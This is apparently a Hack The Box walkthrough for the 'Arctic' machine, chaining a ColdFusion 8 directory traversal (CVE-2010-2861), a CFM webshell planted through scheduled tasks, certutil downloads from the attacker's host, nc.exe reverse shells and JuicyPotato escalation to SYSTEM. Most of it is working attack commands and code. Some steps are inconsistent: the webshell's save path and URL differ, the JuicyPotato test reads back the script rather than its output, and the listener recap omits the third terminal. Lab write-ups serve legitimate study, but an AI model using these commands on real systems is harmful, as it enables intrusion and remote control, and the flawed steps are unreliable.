# HTB: Arctic, Streamlined Walkthrough (Two Listeners Only)

## Tags
#HTB #Arctic #Windows #ColdFusion #DirectoryTraversal #JuicyPotato #Netcat #Hashcat #CVE20102861 #Easy

---

## Box Info

**Target:** `10.129.1.28` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Windows Server 2008 R2

**The gist:** an old Adobe ColdFusion 8 install leaks its own admin password hash through a directory traversal bug, ColdFusion's built-in scheduled tasks feature gets abused to plant a webshell, and JuicyPotato does the rest of the work getting from a low-priv user to SYSTEM. A good one for practicing the "leaked config file → cracked hash → admin panel → RCE" chain end to end.

This version skips the PowerShell one-liner shell entirely and goes straight to an `nc.exe` shell for the foothold, so only **two** listeners are needed for the whole box: one for the initial shell, one for the SYSTEM shell at the end.

## 2. Leak the Admin Password Hash

ColdFusion 8 is vulnerable to a directory traversal bug (CVE-2010-2861) via the `locale` parameter on the admin login page, letting you read arbitrary files with a null-byte trick. Same core idea as the traversal techniques in [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]], just aimed at leaking a config file instead of `/etc/passwd`.

```bash
curl -s 'http://10.129.1.28:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en' | grep password
```
You'll get a 40-character hex string back. That length is a tell on its own, 40 hex characters means SHA1.

> 📸 Screenshot: the leaked password hash from `password.properties`

## 5. Get Your ONE Foothold Shell (nc.exe directly, skip PowerShell)

Rather than doing a PowerShell one-liner shell first and swapping to `nc.exe` later, just go straight to `nc.exe`. This is the one shell used for everything up to JuicyPotato.

**On Kali, host `nc.exe` and start the one persistent listener:**
```bash
# Terminal 1: web server to serve nc.exe
python3 -m http.server 80
```
```bash
# Terminal 2: the ONE foothold listener, keep this open for the rest of the box
rlwrap nc -lvnp 443
```

**Build a self-referencing CFM webshell** (needed to get command execution via a scheduled task):
```bash
cat > shell.cfm << 'EOF'
<html>
<body>
<cfoutput>
<form method="POST" action="shell.cfm">
<input type=text name="cmd" size=80
  <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>>
<input type=submit value="Exec">
</form>
<cfif isdefined("form.cmd")>
<cfexecute name="#Form.cmd#" arguments="" timeout="5"></cfexecute>
</cfif>
</cfoutput>
</body>
</html>
EOF
```

> 📸 Screenshot: creating `shell.cfm`

**In ColdFusion Admin → Debugging & Logging → Scheduled Tasks → Schedule New Task:**
- URL: `http://YOUR_KALI_IP/shell.cfm`
- Save output to file: `C:\ColdFusion8\wwwroot\shell.cfm`
- Submit, then Run.

> 📸 Screenshot: the scheduled task configuration

**Visit the shell, now dropped onto the target's own web root:**
```
http://10.129.1.28:8500/CFIDE/administrator/shell.cfm
```

> 📸 Screenshot: the webshell live in the browser

In the `cmd` field, pull `nc.exe` onto the target:
```
cmd.exe /c certutil -urlcache -split -f "http://YOUR_KALI_IP/nc.exe" C:\ProgramData\nc.exe
```
> 🔍 Full breakdown of the `certutil` flags and why this LOLBIN trick works: [[Privilege Escalation & Local Exploitation (Breakdowns)#certutil repurposed as a LOLBIN downloader|Command Breakdowns]]

(Grab `nc.exe` from [github.com/int0x33/nc.exe](https://github.com/int0x33/nc.exe) if you don't already have a copy, and drop it in the same folder being served by `python3 -m http.server 80`.)

**Now fire the reverse shell, straight to `nc.exe`, no PowerShell step:**
```
cmd.exe /c C:\ProgramData\nc.exe 10.10.14.7 443 -e cmd.exe
```
Terminal 2's listener (port 443) catches a stable `cmd.exe` shell as `arctic\tolis`. This is the only shell needed all the way through to root.

> 📸 Screenshot: the foothold shell caught on the listener

> 🔗 **PayloadsAllTheThings** Reverse Shell Cheatsheet: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), worth checking if `nc.exe` isn't already sitting on the target and a different delivery/shell format is needed instead.

## 7. Privilege Escalation, JuicyPotato (using the SAME shell)

Everything from here happens inside the shell already caught above.

**Check the privilege exists:**
```cmd
whoami /priv
```
Look for `SeImpersonatePrivilege` = Enabled. This is the exact permission JuicyPotato (and the whole "potato" family of exploits) needs to work its token-impersonation trick.

**Get JuicyPotato onto the box** (same download pattern, same web server terminal from before):
```cmd
certutil -urlcache -split -f "http://YOUR_KALI_IP/JuicyPotato.exe" C:\ProgramData\JuicyPotato.exe
```

**Sanity-test JuicyPotato with a harmless `.bat` file first, no listener needed yet:**
```cmd
echo whoami > C:\ProgramData\test.bat
C:\ProgramData\JuicyPotato.exe -l 1337 -p C:\ProgramData\test.bat -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
type C:\ProgramData\test.bat
```
If it now says `nt authority\system`, JuicyPotato works on this box with this CLSID. If it still says `arctic\tolis`, try a different CLSID from JuicyPotato's list for Server 2008 R2 before going any further.

> 🔍 Full breakdown of every JuicyPotato flag, and what the CLSID actually is: [[Privilege Escalation & Local Exploitation (Breakdowns)#JuicyPotato: -l/-t/-c flags and the CLSID token-impersonation trick|Command Breakdowns]]
> 🔗 **GTFOBins**: [gtfobins.github.io](https://gtfobins.github.io/), the Windows equivalent of what JuicyPotato is doing here (an over-privileged service token) is really the same "abuse a legitimate privilege to get a shell as someone else" idea GTFOBins catalogs for Linux SUID/sudo binaries. Worth having the habit of checking there too on future Linux boxes.

> 📸 Screenshot: the `.bat` test confirming JuicyPotato flips to SYSTEM

## 8. Get Your SECOND (and last) Listener, SYSTEM Shell

**On Kali, Terminal 3:**
```bash
rlwrap nc -lvnp 4445
```

**Back in the existing `nc.exe` shell (still connected as `tolis`), fire JuicyPotato for real:**
```cmd
C:\ProgramData\JuicyPotato.exe -l 1338 -p C:\Windows\System32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} -a "/c C:\ProgramData\nc.exe 10.10.14.7 4445 -e cmd.exe"
```
(Use a different `-l` port than the test run, e.g. 1338, just to avoid any leftover binding conflicts.)

> 📸 Screenshot: JuicyPotato executing, `CreateProcessWithTokenW OK`

Terminal 3's listener catches a SYSTEM shell.

## Listener Count Recap

| Terminal | Purpose | Stays open until |
|---|---|---|
| 1 | `python3 -m http.server 80` | Once `nc.exe`, `JuicyPotato.exe`, and `shell.cfm` are all pulled down, safe to close |
| 2 | `nc -lvnp 443`, foothold shell | Root flag grabbed, this is the working shell the whole time |

That's the whole box: one web server, one foothold shell, one SYSTEM shell. No PowerShell one-liner shell, no extra intermediate `nc` hop.

## Common Failure Points (recap)

| Symptom | Likely cause | Fix |
|---|---|---|
| JuicyPotato `.bat` test doesn't flip to SYSTEM | Wrong CLSID for this OS build, or `SeImpersonatePrivilege` disabled | Check `whoami /priv`, try alternate CLSIDs |
| `CreateProcessWithTokenW Failed` | `nc.exe` not referenced by full path | Always use `C:\ProgramData\nc.exe`, never a bare `nc.exe` |
| No connection on the final listener | Listener started after JuicyPotato ran, or `-l` port already bound from the test run | Start the listener first, use a fresh `-l` port for the real run |
| Webshell 404s after the scheduled task | Task didn't actually run, or saved to the wrong path | Re-check "Save output to file" matches ColdFusion's `wwwroot` path exactly |
